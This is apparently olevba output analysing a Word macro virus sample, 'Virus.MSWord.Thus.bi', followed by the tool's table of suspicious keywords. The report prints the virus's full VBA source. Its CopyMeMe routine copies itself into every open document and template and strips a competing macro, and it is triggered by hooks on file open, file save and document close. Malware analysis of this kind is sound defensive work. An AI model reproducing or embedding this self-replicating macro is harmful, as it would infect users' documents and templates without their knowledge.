olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.bi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.bi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ActiveVBModule.bas 
in file: Virus.MSWord.Thus.bi - OLE stream: 'Macros/VBA/ActiveVBModule'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'This code clears the Anti-Symer virus
Sub CopyMeMe()
    On Error Resume Next
    dc% = Documents.Count
    thisn$ = ThisDocument.FullName
    For i% = 1 To dc%
    If Documents(i).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
        Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    If Documents(i).FullName <> thisn$ Then
 
    Application.OrganizerCopy Source:= _
       thisn$, Destination:= _
        Documents(i).FullName, Name:="ActiveVBModule", Object:= _
        wdOrganizerObjectProjectItems
          End If
     Next
    dc% = Templates.Count
    For i% = 1 To dc%
       If Templates(i).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
        Templates(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Templates(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If

    
    Application.OrganizerCopy Source:= _
       thisn$, Destination:= _
        Templates(i).FullName, Name:="ActiveVBModule", Object:= _
        wdOrganizerObjectProjectItems
    Next
End Sub
Sub FileOpen()
On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    CopyMeMe
End Sub
Sub AutoClose()
 On Error Resume Next
 CopyMeMe
End Sub
Sub FileSave()
    On Error Resume Next
    CopyMeMe
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

